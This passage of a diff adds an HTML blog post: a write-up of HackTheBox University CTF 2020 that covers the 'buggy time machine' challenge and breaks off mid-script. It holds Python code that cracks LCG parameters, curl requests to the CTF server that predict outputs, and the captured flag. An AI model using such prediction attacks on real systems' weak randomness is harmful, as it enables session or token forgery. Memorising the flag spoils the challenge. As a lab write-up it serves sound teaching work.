@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>HTB Uni CTF 2020</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#buggy-time-machine">buggy time machine</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#initial-review">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#cracking-lcg-parameters">cracking LCG parameters</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#predicting-the-next-year">predicting the next year</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#determining-what-seed-gets-us-to-2020">determining what seed gets us to 2020</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#rigged-lottery">rigged_lottery</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#initial-review-1">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#putting-it-all-together">putting it all together</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#mirror">mirror</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#initial-review-2">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#leaking-libc">leaking libc</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#putting-it-all-together-1">putting it all together</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#hi-my-name-is-what">Hi! My name is (what?)</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#initial-review-3">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#i-can-so-ptrace-alternative-title-how-you-can-just-overwrite-any-dynamic-library-function">i can so ptrace (alternative title: how you can just overwrite any dynamic library function)</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#ircware">ircware</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#initial-review-4">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/htb-uni-ctf-2020/#so-what-s-the-password">so what&#x27;s the password?</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>HTB Uni CTF 2020</h1>
+    </header>
+
+    <div class="content">
+        <p>A couple weeks back I competed in HackTheBox's university CTF with a few other students from the Texas A&amp;M Cybersecurity Club.  We placed in 37th place out of a few hundred.</p>
+<span id="continue-reading"></span><h1 id="buggy-time-machine">buggy time machine</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I am the Doctor and I am in huge trouble. Rumors have it, you are the best time machine engineer in the galaxy. I recently bought a new randomiser for Tardis on Yquantine, but it must be counterfeit. Now every time I want to time travel, I will end up in a random year. Could you help me fix this? I need to find Amy and Rory! Daleks are after us. Did I say I am the Doctor?
+</span></code></pre>
+<h2 id="initial-review">initial review</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">from </span><span>datetime </span><span style="color:#ffa759;">import </span><span>datetime
+</span><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>Flask</span><span style="color:#ccc9c2cc;">, </span><span>render_template
+</span><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>request
+</span><span style="color:#ffa759;">import </span><span>random
+</span><span style="color:#ffa759;">from </span><span>math </span><span style="color:#ffa759;">import </span><span>gcd
+</span><span style="color:#ffa759;">import </span><span>json
+</span><span style="color:#ffa759;">from </span><span>secret </span><span style="color:#ffa759;">import </span><span>flag</span><span style="color:#ccc9c2cc;">, </span><span>hops</span><span style="color:#ccc9c2cc;">, </span><span>msg
+</span><span>
+</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">TimeMachineCore</span><span>:
+</span><span>	
+</span><span>	n </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
+</span><span>	m </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
+</span><span>	c </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
+</span><span>		
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__init__</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">seed</span><span>):
+</span><span>		</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>year </span><span style="color:#f29e74;">= </span><span>seed 
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">next</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>		</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>year </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>year </span><span style="color:#f29e74;">* </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>m </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>c) </span><span style="color:#f29e74;">% </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>n
+</span><span>		</span><span style="color:#ffa759;">return </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>year
+</span><span>
+</span><span>app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span>(__name__)
+</span><span>a </span><span style="color:#f29e74;">= </span><span>datetime</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">now</span><span>()
+</span><span>seed </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(a</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strftime</span><span>(</span><span style="color:#bae67e;">&#39;</span><span style="color:#ffcc66;">%Y%m%d</span><span style="color:#bae67e;">&#39;</span><span>)) </span><span style="color:#f29e74;">&lt;&lt;</span><span style="color:#ffcc66;">1337 </span><span style="color:#f29e74;">% </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getrandbits</span><span>(</span><span style="color:#ffcc66;">128</span><span>)
+</span><span>gen </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">TimeMachineCore</span><span>(seed)
+</span><span>
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/next_year&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">next_year</span><span>():
+</span><span>	</span><span style="color:#ffa759;">return </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&#39;year&#39;</span><span style="color:#ccc9c2cc;">:</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span>())})
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/predict_year&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">predict_year</span><span>():
+</span><span>	
+</span><span>	prediction </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>json[</span><span style="color:#bae67e;">&#39;year&#39;</span><span>]
+</span><span>	</span><span style="color:#ffa759;">try</span><span>:
+</span><span>
+</span><span>		</span><span style="color:#ffa759;">if </span><span>prediction </span><span style="color:#f29e74;">==</span><span>gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span>():
+</span><span>			</span><span style="color:#ffa759;">return </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&#39;msg&#39;</span><span style="color:#ccc9c2cc;">: </span><span>msg})
+</span><span>		</span><span style="color:#ffa759;">else</span><span>:
+</span><span>			</span><span style="color:#ffa759;">return </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&#39;fail&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;wrong year&#39;</span><span>})
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">except</span><span>:
+</span><span>
+</span><span>		</span><span style="color:#ffa759;">return </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&#39;error&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;year not found in keys.&#39;</span><span>})
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/travelTo2020&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">travelTo2020</span><span>():
+</span><span>	seed </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>json[</span><span style="color:#bae67e;">&#39;seed&#39;</span><span>]
+</span><span>	gen </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">TimeMachineCore</span><span>(seed)
+</span><span>	</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(hops): state </span><span style="color:#f29e74;">= </span><span>gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span>()
+</span><span>	</span><span style="color:#ffa759;">if </span><span>state </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">2020</span><span>:
+</span><span>		</span><span style="color:#ffa759;">return </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&#39;flag&#39;</span><span style="color:#ccc9c2cc;">: </span><span>flag})
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">home</span><span>():
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;index.html&#39;</span><span>)
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>	app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#ffcc66;">debug</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
+</span></code></pre>
+<p>The first thing I noticed is that TimeMachineCore is a <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">linear congruential generator</a>.  LCGs are not cryptographically secure so it is highly likely that we will be attacking the randomness.</p>
+<p>We have three routes that we can interact with the time machine with:</p>
+<ul>
+<li><code>/next_year</code> which generates a random number using a TimeMachineCore that was seeded with random bits at the beginning of the program</li>
+<li><code>/predict_year</code> which will give us the secret variable <code>msg</code> if we can predict the number it generates</li>
+<li><code>travelTo2020</code> which will give us the flag if we can provided it a seed which generates <code>2020</code> after <code>hops</code> random numbers</li>
+</ul>
+<h2 id="cracking-lcg-parameters">cracking LCG parameters</h2>
+<p>So the first thing to do here is cracking the LCG parameters.  We have the ability to generate and receive an arbitrary number LCG states so it is pretty trivial to reverse engineer what the parameters which generated it are.  I'm not going to go into the math behind how it works, but <a href="https://tailcall.net/blog/cracking-randomness-lcgs/">Cracking RNGs: Linear Congruential Generators</a> is the article I used if you would like to read about it.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>functools </span><span style="color:#ffa759;">import </span><span style="color:#f28779;">reduce
+</span><span style="color:#ffa759;">from </span><span>math </span><span style="color:#ffa759;">import </span><span>gcd
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">egcd</span><span>(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">b</span><span>):
+</span><span>    lastremainder, remainder </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span>(a), </span><span style="color:#f28779;">abs</span><span>(b)
+</span><span>    x, lastx, y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span>, </span><span style="color:#ffcc66;">1</span><span>, </span><span style="color:#ffcc66;">1</span><span>, </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#ffa759;">while </span><span>remainder:
+</span><span>        lastremainder, (quotient</span><span style="color:#ccc9c2cc;">, </span><span>remainder) </span><span style="color:#f29e74;">= </span><span>remainder, </span><span style="color:#f28779;">divmod</span><span>(lastremainder</span><span style="color:#ccc9c2cc;">, </span><span>remainder)
+</span><span>        x, lastx </span><span style="color:#f29e74;">= </span><span>lastx </span><span style="color:#f29e74;">- </span><span>quotient</span><span style="color:#f29e74;">*</span><span>x, x
+</span><span>        y, lasty </span><span style="color:#f29e74;">= </span><span>lasty </span><span style="color:#f29e74;">- </span><span>quotient</span><span style="color:#f29e74;">*</span><span>y, y
+</span><span>    </span><span style="color:#ffa759;">return </span><span>lastremainder, lastx </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span>a </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span>), lasty </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span>b </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">modinv</span><span>(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">m</span><span>):
+</span><span>    g, x, y </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">egcd</span><span>(a</span><span style="color:#ccc9c2cc;">, </span><span>m)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>g </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">1</span><span>:
+</span><span>        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&#39;modinv for </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> does not exist&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(a))
+</span><span>    </span><span style="color:#ffa759;">return </span><span>x </span><span style="color:#f29e74;">% </span><span>m
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_increment</span><span>(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">multiplier</span><span>):
+</span><span>    increment </span><span style="color:#f29e74;">= </span><span>(states[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">*</span><span>multiplier) </span><span style="color:#f29e74;">% </span><span>modulus
+</span><span>    </span><span style="color:#ffa759;">return </span><span>modulus, multiplier, increment
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span>(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span>):
+</span><span>    multiplier </span><span style="color:#f29e74;">= </span><span>(states[</span><span style="color:#ffcc66;">2</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">1</span><span>]) </span><span style="color:#f29e74;">* </span><span style="color:#ffd580;">modinv</span><span>(states[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>modulus) </span><span style="color:#f29e74;">% </span><span>modulus
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_increment</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>modulus</span><span style="color:#ccc9c2cc;">, </span><span>multiplier)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_modulus</span><span>(</span><span style="color:#ffcc66;">states</span><span>):
+</span><span>    diffs </span><span style="color:#f29e74;">= </span><span>[s1 </span><span style="color:#f29e74;">- </span><span>s0 </span><span style="color:#ffa759;">for </span><span>s0</span><span style="color:#ccc9c2cc;">, </span><span>s1 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>])]
+</span><span>    zeroes </span><span style="color:#f29e74;">= </span><span>[t2</span><span style="color:#f29e74;">*</span><span>t0 </span><span style="color:#f29e74;">- </span><span>t1</span><span style="color:#f29e74;">*</span><span>t1 </span><span style="color:#ffa759;">for </span><span>t0</span><span style="color:#ccc9c2cc;">, </span><span>t1</span><span style="color:#ccc9c2cc;">, </span><span>t2 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(diffs</span><span style="color:#ccc9c2cc;">, </span><span>diffs[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>diffs[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:</span><span>])]
+</span><span>    modulus </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span>(</span><span style="color:#f28779;">reduce</span><span>(gcd</span><span style="color:#ccc9c2cc;">, </span><span>zeroes))
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>modulus)
+</span><span>
+</span><span>
+</span><span>values </span><span style="color:#f29e74;">= </span><span>[
+</span><span>	</span><span style="color:#ffcc66;">584293201</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">1514369420</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">1930412587</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">1483060100</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">279230708</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">1138137296</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">2098757662</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">1590055177</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">340421540</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">2090774143</span><span style="color:#ccc9c2cc;">,
+</span><span>	</span><span style="color:#ffcc66;">617182341
+</span><span>]
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffd580;">crack_unknown_modulus</span><span>(values))
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python crack_lcg_parameters.py
+</span><span>(2147483647, 48271, 0)
+</span></code></pre>
+<h2 id="predicting-the-next-year">predicting the next year</h2>
+<p>We know the parameters and the last state so we can just solve for the next year trivially like so: <code>(617182341 * 48271) mod 2147483647</code></p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ curl -X POST http://docker.hackthebox.eu:30263/predict_year --header &quot;Content-Type: application/json&quot;  --data &#39;{&quot;year&quot;: 465839415}&#39;
+</span><span>{&quot;msg&quot;: &quot;*Tardis trembles*\nDoctor this is Amy! I am with Rory in year 2020. You need to rescue us within exactly 876578 hops. Tardis bug has damaged time and space.\nRemeber, 876578 hops or the universes will collapse!&quot;}
+</span></code></pre>
+<h2 id="determining-what-seed-gets-us-to-2020">determining what seed gets us to 2020</h2>
+<p>Fun fact: an LCG is reversible!  I'm not gonna bother with the math but it's a fairly simple function to get the previous state and you can see it in my solution script below.  See <a href="https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator">this stackoverflow post</a> if you're interested in the math.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ curl -X POST http://docker.hackthebox.eu:30263/travelTo2020 --header &quot;Content-Type: application/json&quot;  --data &#39;{&quot;seed&quot;: 2113508741}&#39;
+</span><span>{&quot;flag&quot;: &quot;HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}&quot;}
+</span></code></pre>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>functools </span><span style="color:#ffa759;">import </span><span style="color:#f28779;">reduce
+</span><span style="color:#ffa759;">from </span><span>math </span><span style="color:#ffa759;">import </span><span>gcd
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">egcd</span><span>(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">b</span><span>):
+</span><span>    lastremainder, remainder </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span>(a), </span><span style="color:#f28779;">abs</span><span>(b)
+</span><span>    x, lastx, y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span>, </span><span style="color:#ffcc66;">1</span><span>, </span><span style="color:#ffcc66;">1</span><span>, </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#ffa759;">while </span><span>remainder:
+</span><span>        lastremainder, (quotient</span><span style="color:#ccc9c2cc;">, </span><span>remainder) </span><span style="color:#f29e74;">= </span><span>remainder, </span><span style="color:#f28779;">divmod</span><span>(lastremainder</span><span style="color:#ccc9c2cc;">, </span><span>remainder)
+</span><span>        x, lastx </span><span style="color:#f29e74;">= </span><span>lastx </span><span style="color:#f29e74;">- </span><span>quotient</span><span style="color:#f29e74;">*</span><span>x, x
+</span><span>        y, lasty </span><span style="color:#f29e74;">= </span><span>lasty </span><span style="color:#f29e74;">- </span><span>quotient</span><span style="color:#f29e74;">*</span><span>y, y
+</span><span>    </span><span style="color:#ffa759;">return </span><span>lastremainder, lastx </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span>a </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span>), lasty </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span>b </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">modinv</span><span>(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">m</span><span>):
+</span><span>    g, x, y </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">egcd</span><span>(a</span><span style="color:#ccc9c2cc;">, </span><span>m)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>g </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">1</span><span>:
+</span><span>        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&#39;modinv for </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> does not exist&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(a))
+</span><span>    </span><span style="color:#ffa759;">return </span><span>x </span><span style="color:#f29e74;">% </span><span>m
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_increment</span><span>(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">multiplier</span><span>):
+</span><span>    increment </span><span style="color:#f29e74;">= </span><span>(states[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">*</span><span>multiplier) </span><span style="color:#f29e74;">% </span><span>modulus
+</span><span>    </span><span style="color:#ffa759;">return </span><span>modulus, multiplier, increment
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span>(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span>):
+</span><span>    multiplier </span><span style="color:#f29e74;">= </span><span>(states[</span><span style="color:#ffcc66;">2</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">1</span><span>]) </span><span style="color:#f29e74;">* </span><span style="color:#ffd580;">modinv</span><span>(states[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">- </span><span>states[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>modulus) </span><span style="color:#f29e74;">% </span><span>modulus
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_increment</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>modulus</span><span style="color:#ccc9c2cc;">, </span><span>multiplier)
+</span><span>
+</span><span>
